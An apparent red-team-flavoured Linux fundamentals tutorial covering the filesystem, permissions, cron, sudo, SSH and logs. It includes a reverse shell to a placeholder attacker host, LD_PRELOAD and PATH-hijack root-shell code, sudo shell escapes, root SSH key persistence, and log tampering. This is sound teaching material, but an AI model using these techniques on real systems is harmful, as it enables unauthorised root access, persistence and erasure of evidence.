Linux Fundamentals — The Complete Foundation

2026-06-04 · 7 min read · Learn · linux fundamentals bash permissions red-team privesc

Filesystem, permissions, users, processes, services, networking, bash, cron, logs, and a red team lens on every concept that matters in practice.

Linux runs on the vast majority of servers, cloud infrastructure, embedded devices, and CTF targets you will ever encounter. Whether you're reading log files after an incident, escalating privileges on a box, writing automation, or just administering a machine — you need a genuine understanding of how Linux works, not just a list of commands to copy-paste.

This guide builds from the filesystem up. Red team perspectives are embedded throughout — not because every operation is offensive, but because understanding how attackers abuse things is the fastest way to understand why they're designed the way they are.

01 The Filesystem Hierarchy

Linux uses a single unified tree rooted at /. Everything — files, devices, sockets, processes — is a file in this tree. There are no drive letters.

DirectoryPurposeRed team relevance
`/`Root of the entire filesystem—
`/bin`Essential user binaries (`ls`, `cp`, `cat`)GTFO bins live here
`/sbin`System binaries (`iptables`, `fdisk`)Admin tools, often exploitable
`/usr/bin`Most installed user programs
`/usr/local/bin`Locally compiled/installed programsOften writable
`/etc`System-wide config filesCredentials, SSH keys, cron, sudoers
`/home`User home directories`.ssh/`, `.bash_history`, config files
`/root`Root's home directoryFlag files, SSH keys
`/tmp`Temporary files, world-writableWrite exploits/payloads here
`/var`Variable data — logs, mail, spool`/var/log/`, `/var/mail/`
`/var/log`System logsEvidence of activity, credleaks
`/proc`Kernel/process info as filesProcess memory, environment, maps
`/sys`Kernel hardware interface
`/dev`Device files`/dev/null`, `/dev/shm` (tmpfs, noexec varies)
`/opt`Optional/third-party softwareOften poorly locked down
`/lib`, `/lib64`Shared librariesLD_PRELOAD hijack target
`/run`Runtime data (PIDs, sockets)
`/boot`Kernel, bootloader
`/media`, `/mnt`Mount pointsNFS mounts, interesting shares

/proc is particularly powerful. Every running process has a directory /proc/<PID>/ containing:
- cmdline — the exact command that launched it
- environ — its full environment variables (may contain secrets)
- fd/ — file descriptors (open files, sockets, pipes)
- maps — memory map (loaded libraries, heap, stack)
- status — UID, GID, threads, memory stats

/proc/self always points to your own process.

bash Navigating the filesystem 
# Where am I?
pwd

# List files (long format, hidden files, human sizes)
ls -lah
ls -lahR /etc/    # recursive

# Navigate
cd /etc
cd ~              # home directory
cd -              # previous directory

# Find files
find / -name "*.conf" 2>/dev/null
find /etc -type f -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null          # find SSH private keys
find / -name "*.log" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null   # WordPress creds
find / -name ".env" 2>/dev/null            # dotenv secrets

# Find recently modified files
find /etc -mmin -60 2>/dev/null            # modified in last 60 min
find / -newer /tmp/reference 2>/dev/null   # newer than a reference file

# Read /proc for process info
cat /proc/1/cmdline | tr '\0' ' '          # PID 1 (init/systemd) command
cat /proc/self/environ | tr '\0' '\n'      # your environment
ls -la /proc/self/fd                       # your open file descriptors
cat /proc/version                          # kernel version
cat /proc/cpuinfo
cat /proc/meminfo

02 File Permissions

Every file and directory has an owner (user), an owning group, and three sets of permissions: owner, group, others.

text 
-rwxr-xr--  1  alice  devs  4096  Jun 4  script.sh
│└┬┘└┬┘└┬┘
│ │  │  └── others: read only (r--)
│ │  └───── group:  read + execute (r-x)
│ └──────── owner:  read + write + execute (rwx)
└────────── file type: - = regular, d = directory, l = symlink, s = socket

Permission bits:

SymbolOctalMeaning
`r`4Read
`w`2Write
`x`1Execute (or enter directory)
`-`0No permission

Octal notation adds the bits: rwx = 4+2+1 = 7, r-x = 4+0+1 = 5, rw- = 4+2+0 = 6.

So chmod 755 = rwxr-xr-x (owner full, everyone else read+execute).

Special Bits

BitOn fileOn directory
**SUID** (4xxx)Runs as file's *owner*, not caller—
**SGID** (2xxx)Runs as file's *group*New files inherit directory's group
**Sticky** (1xxx)—Only owner can delete their files (`/tmp`)

SUID is a privesc goldmine. If a binary runs as root (owner=root, SUID set), any code execution inside it gives you root.

text 
-rwsr-xr-x  root  root  /usr/bin/passwd
    ↑ 's' in execute position = SUID set

Access Control Lists (ACLs)

Beyond the basic rwx, setfacl/getfacl allow per-user, per-group rules on individual files — check these when standard permissions look locked but something still has access.

bash Permissions — read, change, and exploit 
# View permissions
ls -la /etc/passwd
stat /etc/shadow

# Change permissions
chmod 755 script.sh
chmod u+x script.sh         # add execute for owner
chmod o-w file.txt          # remove write for others
chmod 600 ~/.ssh/id_rsa     # SSH key must be 600 or ssh refuses it

# Change owner / group
chown alice:devs file.txt
chown -R www-data:www-data /var/www/html

# Find SUID binaries (privesc hunting)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find world-writable files/directories
find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# Find world-writable directories (drop payloads)
find / -writable -type d 2>/dev/null

# Read ACLs
getfacl /etc/passwd
getfacl -R /var/www/html

# Check capabilities (another privesc vector)
getcap -r / 2>/dev/null
# e.g. python3 cap_setuid+eip → can setuid to root

03 Users, Groups & Identity

Linux identifies users and groups by UID (User ID) and GID (Group ID) — not by name. Names are just a lookup in /etc/passwd.

Key Files

/etc/passwd — one line per user:

text 
root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001::/home/alice:/bin/bash
nobody:x:65534:65534::/nonexistent:/usr/sbin/nologin

username : password_placeholder : UID : GID : comment : home : shell

The x in the password field means the hash is in /etc/shadow. An empty field means no password. A * or ! means login disabled.

/etc/shadow — password hashes, readable only by root:

text 
alice:$6$rounds=5000$salt$hash...:19120:0:99999:7:::

Format: $id$salt$hash — $6$ = SHA-512, $5$ = SHA-256, $1$ = MD5, $2y$ = bcrypt.

/etc/group — group memberships:

text 
sudo:x:27:alice,bob
docker:x:998:alice

Privileged Groups to Know

GroupWhy it matters
`sudo` / `wheel`Members can run commands as root via sudo
`docker`Mount host filesystem inside a container → root
`lxd` / `lxc`Similar container escape to root
`disk`Direct read/write access to block devices → read any file
`adm`Read system logs (may contain credentials)
`shadow`Read `/etc/shadow` → crack all password hashes
`root`GID 0 — full system access

Real vs Effective UID

Every process has three UIDs: real (who launched it), effective (what it runs as — changed by SUID), and saved (the original effective, for privilege drop). id shows your current real and effective.

bash User and identity enumeration 
# Who am I?

whoami

# All logged-in users

w

# All users on the system

# Groups
cat /etc/group

id alice

# Sudo configuration

# Switch user

# Add user to sudo group (if you have permission)
usermod -aG sudo alice

# Read shadow file (if root or in shadow group)

# Crack hashes offline
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # SHA-512
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

05 Process Management

A process is a running instance of a program. Every process has a PID, a parent PID (PPID), an owner (UID), and a set of open file descriptors.

Process states:
- R — Running / Runnable
- S — Sleeping (interruptible)
- D — Sleeping (uninterruptible, usually I/O)
- Z — Zombie (finished but parent hasn't reaped it)
- T — Stopped (SIGSTOP or traced by debugger)

Signals — important ones:

SignalNumberMeaning
SIGHUP1Hangup — reload config (daemons)
SIGINT2Interrupt (Ctrl+C)
SIGKILL9Kill immediately, cannot be caught
SIGTERM15Graceful terminate (can be caught)
SIGSTOP19Pause process (cannot be caught)
SIGCONT18Resume a stopped process

Red team relevance: Killing monitoring/AV processes requires SIGKILL and root. Processes running as root with user-controlled input are privilege escalation targets. Background processes listening on sockets are pivot targets.

bash Process enumeration and management 
# Snapshot of all processes
ps aux
ps -eFf                      # full format with ppid
ps aux | grep apache

# Live process monitor
top
htop                         # better UI (may need installing)

# Process tree
pstree -p

# Find process by name / port
pgrep nginx
pgrep -a sshd                # with full command line
ss -tlnp                     # sockets with owning process
netstat -tlnp                # same (older)
lsof -i :80                  # what's on port 80
lsof -p 1234                 # open files for PID 1234

# Kill processes
kill 1234             # SIGTERM (15)
kill -9 1234          # SIGKILL
killall nginx
pkill -9 python3

# Background / foreground
long_command &        # run in background
jobs                  # list background jobs
fg %1                 # bring job 1 to foreground
bg %1                 # send to background
Ctrl+Z                # suspend current process
nohup ./payload &     # survive terminal close

# Screen / tmux — persist sessions across disconnects
screen -S mysession
screen -ls
screen -r mysession
tmux new -s hack
tmux ls
tmux attach -t hack

# Red team: read other processes' environment (may have secrets)
cat /proc/1337/environ 2>/dev/null | tr '\0' '\n'
strings /proc/1337/mem 2>/dev/null   # requires root

# Find processes running as root
ps aux | awk '$1=="root" {print}'

06 Services & systemd

Modern Linux systems use systemd as PID 1 — it manages services (called units), handles boot order, logging (journald), and more.

A service unit file at /etc/systemd/system/myservice.service or /lib/systemd/system/ defines how the service starts, stops, restarts, and what user it runs as.

ini 
[Unit]
Description=My Web App
After=network.target

[Service]
User=www-data
WorkingDirectory=/opt/app
ExecStart=/usr/bin/python3 app.py
Restart=on-failure

[Install]
WantedBy=multi-user.target

Red team: If you can write to a service unit file (or the binary it calls), you control code that runs as whatever User= is set to — often root for system services. Unit files in writable paths are a classic privesc vector.

bash systemd — managing and abusing services 
# Service status
systemctl status ssh
systemctl status nginx

# Start / stop / restart / reload
systemctl start nginx
systemctl stop nginx
systemctl restart nginx
systemctl reload nginx      # reload config without restart

# Enable / disable at boot
systemctl enable ssh
systemctl disable ssh

# List all services
systemctl list-units --type=service
systemctl list-units --type=service --state=running

# View service logs (journald)
journalctl -u nginx
journalctl -u nginx -f      # follow live
journalctl -u nginx --since "1 hour ago"
journalctl -xe              # last boot, verbose

# Find writable service files (privesc check)
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null

# Find services running as root with writable ExecStart binary
systemctl list-units --type=service --state=running | awk '{print $1}' | \
  xargs -I{} systemctl show {} --property=ExecStart,User 2>/dev/null

# Reload after editing unit file
systemctl daemon-reload
systemctl restart modified-service

07 Cron Jobs — Scheduled Tasks

Cron runs commands on a schedule. It's one of the most common privilege escalation vectors because scripts run automatically — often as root — without anyone watching.

Cron syntax:

text 
* * * * *  command
│ │ │ │ └── day of week (0=Sun … 6=Sat)
│ │ │ └──── month (1–12)
│ │ └────── day of month (1–31)
│ └──────── hour (0–23)
└────────── minute (0–59)

Examples:
- 0 * * * * — every hour on the hour
- */5 * * * * — every 5 minutes
- 0 2 * * 0 — 2am every Sunday
- @reboot — on boot

Where cron jobs live:

LocationWho uses it
`crontab -e` / `/var/spool/cron/crontabs/`Per-user crontab
`/etc/crontab`System-wide, specifies user in field 6
`/etc/cron.d/`Drop-in cron files
`/etc/cron.hourly/`, `/etc/cron.daily/`Scripts run by `run-parts`

Classic privesc patterns:
- Root's crontab runs a script that's world-writable → overwrite it
- Root's crontab calls a binary whose directory is writable → drop a malicious file with the same name
- Root's crontab uses a wildcard * with tar, chown, chmod → argument injection
- Script uses a PATH that includes /tmp before system paths → drop a malicious binary named the same

bash Cron enumeration and abuse 
# View your crontab
crontab -l

# System crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
cat /etc/cron.d/*

# All user crontabs (root only)
cat /var/spool/cron/crontabs/*

# Watch for processes spawned by cron (reveals hidden cron jobs)
watch -n 1 "ps aux --sort=start_time | tail -20"
# Or use pspy — no root needed, monitors procfs
curl -sLo /tmp/pspy https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x /tmp/pspy && /tmp/pspy

# Find scripts called by cron that are writable
crontab -l 2>/dev/null | grep -oE '/[^ ]+' | xargs ls -la 2>/dev/null

# Tar wildcard injection — if cron runs: tar -czf backup.tgz *
# Create files that become arguments to tar:
echo "/bin/bash -i >& /dev/tcp/attacker/4444 0>&1" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Edit a writable cron script
echo 'chmod u+s /bin/bash' >> /path/to/writable_cron_script.sh
# Wait for cron to run, then:
bash -p    # -p preserves SUID effective UID

08 Environment Variables & PATH Hijacking

Environment variables are key=value pairs inherited by processes from their parent. They affect behaviour at runtime.

VariablePurpose
`PATH`Directories searched for commands in order
`HOME`Current user's home directory
`USER` / `LOGNAME`Username
`SHELL`Default shell
`TERM`Terminal type
`LD_PRELOAD`Shared library loaded before all others
`LD_LIBRARY_PATH`Additional library search directories
`PYTHONPATH`Extra directories for Python imports
`HISTFILE`Where bash history is saved
`HISTFILESIZE` / `HISTSIZE`History length limits

PATH Hijacking

If a SUID binary (or a sudo rule) calls a command by name without an absolute path, and you control a directory that appears earlier in PATH, you win:

bash 
# Vulnerable binary calls: system("cat /etc/passwd") internally
# Export a modified PATH with /tmp first
export PATH=/tmp:$PATH
# Drop a fake 'cat' in /tmp
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
# Run the vulnerable binary
./vuln_binary   # calls /tmp/cat instead of /bin/cat → root shell

LD_PRELOAD

If a sudo rule allows running a binary and env_keep+=LD_PRELOAD is set in sudoers, you can inject a shared library into a root process:

c 
// inject.c
#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) pwn() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
bash 
gcc -shared -fPIC -o /tmp/inject.so inject.c
sudo LD_PRELOAD=/tmp/inject.so /usr/bin/allowed_binary
bash Environment variable enumeration 
# Print all environment variables
env
printenv
set | head -40

# Specific variables
echo $PATH
echo $HOME
echo $SHELL
echo $LD_PRELOAD

# Bash history — credentials frequently appear here
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null

# Find env vars containing 'pass' or 'key'
env | grep -i -E 'pass|key|secret|token|api'

# Check sudo rules for unsafe env settings
sudo -l | grep -E 'env_keep|SETENV|LD_'

# Persistent environment (set for all sessions)
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile
cat /etc/environment
cat /etc/profile
ls /etc/profile.d/

# Temporarily add /tmp to PATH
export PATH=/tmp:$PATH

# Check which 'python' gets found
which python python3 pip
type python3

10 SSH — Secure Shell

SSH is your primary method of remote access on Linux. Understanding it deeply matters both for using it effectively and for attacking it.

Key-based Authentication

text 
~/.ssh/id_rsa        private key (protect with chmod 600)
~/.ssh/id_rsa.pub    public key (share freely)
~/.ssh/authorized_keys   public keys allowed to log in as this user
~/.ssh/known_hosts   previously seen server fingerprints
~/.ssh/config        client config (aliases, port, identity file)

SSH config file (~/.ssh/config) makes complex connections simple:

text 
Host pivot
    HostName 10.10.10.5
    User alice
    IdentityFile ~/.ssh/id_rsa_pivot
    Port 2222

Host internal
    HostName 10.20.0.50
    User root
    ProxyJump pivot    # route through pivot automatically

Red Team SSH Techniques

Agent forwarding (ssh -A) forwards your SSH agent through a pivot, allowing you to SSH from the pivot to other machines using your local keys — but it also lets the pivot host (if compromised) use your agent.

SSH authorized_keys persistence — if you get write access to ~/.ssh/authorized_keys for any user, add your public key for persistent backdoor access.

Private key hunting — SSH private keys are frequently left in home directories, backups, container images, and Git repos.

bash SSH usage and red team techniques 
# Basic connection
ssh user@10.10.10.5
ssh -p 2222 user@10.10.10.5
ssh -i ~/.ssh/id_rsa user@10.10.10.5

# Generate keypair
ssh-keygen -t ed25519 -C "attacker" -f ~/.ssh/attack_key

# Copy public key to target (authorized access)
ssh-copy-id user@10.10.10.5
# Manual: append to authorized_keys
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys

# Persistence — add attacker key to root's authorized_keys
echo "ssh-ed25519 AAAA...attacker-key" >> /root/.ssh/authorized_keys

# Port forwarding
ssh -L 8080:127.0.0.1:8080 user@10.10.10.5    # local forward
ssh -R 4444:127.0.0.1:4444 user@10.10.10.5    # remote forward
ssh -D 1080 user@10.10.10.5                   # SOCKS proxy

# Execute command without full shell
ssh user@10.10.10.5 "cat /etc/passwd"
ssh user@10.10.10.5 "ps aux | grep root"

# Crack SSH private key passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Find SSH keys on a compromised host
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"   # SSH server config

11 Log Files — Reading the Evidence

Logs are where defenders find attackers — and where attackers find credentials. Know where they are, what they contain, and what to look for.

Log fileContents
`/var/log/auth.log`SSH logins, sudo usage, su, PAM events (Debian/Ubuntu)
`/var/log/secure`Same, on RHEL/CentOS
`/var/log/syslog`General system messages
`/var/log/messages`General (RHEL)
`/var/log/kern.log`Kernel messages
`/var/log/cron`Cron job executions
`/var/log/apache2/access.log`HTTP requests
`/var/log/apache2/error.log`Apache errors
`/var/log/nginx/access.log`Nginx requests
`/var/log/mysql/error.log`MySQL errors
`/var/log/wtmp`Binary — all logins/logouts (`last` reads it)
`/var/log/btmp`Binary — failed login attempts (`lastb` reads it)
`/var/log/lastlog`Binary — last login per user (`lastlog` reads it)

Credentials frequently appear in logs — HTTP basic auth in URLs, MySQL errors with connection strings, application stack traces printing config values.

Log tampering — attackers clear or truncate logs to erase evidence. Defenders use remote log shipping (syslog-ng, rsyslog, Splunk, ELK) specifically to make this harder.

bash Log analysis 
# Follow auth log live (watch for logins during an engagement)
tail -f /var/log/auth.log

# Failed SSH login attempts
grep "Failed password" /var/log/auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful SSH logins
grep "Accepted password\|Accepted publickey" /var/log/auth.log

# Who has used sudo recently
grep "sudo" /var/log/auth.log
grep "COMMAND" /var/log/auth.log

# Web log — look for interesting requests
cat /var/log/nginx/access.log | grep -E "(union|select|exec|cmd|passwd|etc)"
cat /var/log/apache2/access.log | grep " 200 " | awk '{print $7}' | sort | uniq -c | sort -rn

# Failed login attempts (binary log)
last
lastb
lastlog

# journald — all logs via systemd
journalctl --since "30 min ago"
journalctl -u ssh
journalctl _UID=0      # all messages from root processes

# Search logs for credentials (red team)
grep -rHi "password\|passwd\|secret\|api_key\|token" /var/log/ 2>/dev/null

# Clear auth log (anti-forensics — noisy, often detected)
echo > /var/log/auth.log
# Or more surgical — remove your own entries:
grep -v "your.ip.address" /var/log/auth.log > /tmp/.auth.log && mv /tmp/.auth.log /var/log/auth.log

13 Bash Scripting Fundamentals

Bash scripts automate repetitive tasks and glue tools together. Even basic scripting skills massively speed up enumeration, payload staging, and post-exploitation.

bash Bash scripting — essential constructs 
#!/bin/bash
# Shebang line — tells the OS which interpreter to use

# Variables
NAME="alice"
IP="10.10.10.5"
echo "Targeting $NAME at $IP"

# Command substitution
KERNEL=$(uname -r)
echo "Kernel: $KERNEL"
CURRENT_USER=$(whoami)

# Conditionals
if [ -f /etc/shadow ]; then
    echo "shadow readable!"
elif [ -r /etc/passwd ]; then
    echo "passwd readable"
else
    echo "nothing interesting"
fi

# Test operators
# -f file exists and is regular file
# -d directory exists
# -r readable    -w writable    -x executable
# -z string is empty    -n string is not empty
# == -eq    != -ne    -lt -gt -le -ge  (numeric)

# Loops
for PORT in 22 80 443 3389; do
    nc -zv -w1 $IP $PORT 2>/dev/null && echo "$PORT OPEN"
done

# Loop over files
for FILE in /home/*/.ssh/id_rsa; do
    [ -f "$FILE" ] && echo "Found key: $FILE"
done

# While loop
COUNTER=0
while [ $COUNTER -lt 5 ]; do
    echo "Attempt $COUNTER"
    ((COUNTER++))
done

# Read input / read file line by line
while IFS= read -r line; do
    echo "Processing: $line"
done < /etc/passwd

# Functions
check_port() {
    local host=$1
    local port=$2
    nc -zv -w1 "$host" "$port" 2>/dev/null && echo "$host:$port OPEN" || echo "$host:$port CLOSED"
}
check_port 10.10.10.5 80
check_port 10.10.10.5 443

# Exit codes and error handling
set -e           # exit on any error
set -o pipefail  # exit if any pipe command fails
trap 'echo "Error at line $LINENO"' ERR

# Arguments
echo "Script: $0"
echo "First arg: $1"
echo "All args: $@"
echo "Arg count: $#"

# Useful one-liners for recon scripts
# Subnet sweep
for i in $(seq 1 254); do
    ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP" &
done; wait

# Port scan a host
for PORT in $(seq 1 1000); do
    (echo > /dev/tcp/10.10.10.5/$PORT) 2>/dev/null && echo "$PORT open"
done

14 Sudo & Privilege Escalation Vectors

sudo allows running commands as another user (usually root) based on rules in /etc/sudoers. It's the most common legitimate path to privilege — and a frequent misconfiguration target.

Reading sudoers

text 
root    ALL=(ALL:ALL) ALL
alice   ALL=(ALL:ALL) NOPASSWD: /usr/bin/vim
bob     ALL=(root) NOPASSWD: /usr/bin/python3 /opt/script.py
%devs   ALL=(ALL) /usr/bin/systemctl restart nginx
  • alice can run vim as root without a password — trivial shell escape
  • bob can run one specific Python script as root... but if that script is writable, or if Python can import user-controlled files, it escalates
  • %devs requires a password and can only restart nginx — harder to abuse

GTFOBins

GTFOBins catalogs shell escapes for binaries commonly found in SUID and sudo misconfigurations. If a binary is allowed via sudo, check it.

A few examples:

bash 
# sudo vim → shell escape
sudo vim -c ':!/bin/bash'

# sudo less → shell escape
sudo less /etc/passwd
# inside less: !bash

# sudo find
sudo find / -exec /bin/bash \;

# sudo python3
sudo python3 -c 'import os; os.system("/bin/bash")'  

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# sudo nano → Ctrl+R then Ctrl+X then: reset; sh 1>&0 2>&0

16 Key Takeaways

Concepts to have cold:

  • Filesystem hierarchy — where things live and why it matters for finding credentials and writable paths
  • Permission model — read/write/execute for owner/group/others in octal; SUID/SGID/sticky as special cases
  • UID 0 = root regardless of username — always check /etc/passwd for multiple UID 0 entries
  • Everything is a file — devices, sockets, process info in /proc, pipes
  • sudo -l is the first thing you run after getting a shell
  • SUID binaries + GTFOBins is a solved problem — if it's on the list, it's exploitable
  • Cron jobs run silently and automatically — writable scripts called by root cron = privesc
  • Logs tell the full story — both for blue team analysis and red team credential hunting
  • SSH keys last forever unless revoked — always check authorized_keys, always check for stray private keys
  • A dumb shell without TTY will break everything — always upgrade with python3 -c 'import pty; pty.spawn("/bin/bash")' immediately

Tools to know:
find, grep, awk, sed, ss, ps, systemctl, crontab, sudo, id, linpeas, pspy, ssh, scp, nc, curl

Linux mastery is cumulative. Every command you understand at the conceptual level — not just by copying it — makes the next one faster to learn. The shell is a force multiplier: the same fluency that makes you a fast sysadmin makes you a fast attacker and a fast defender.
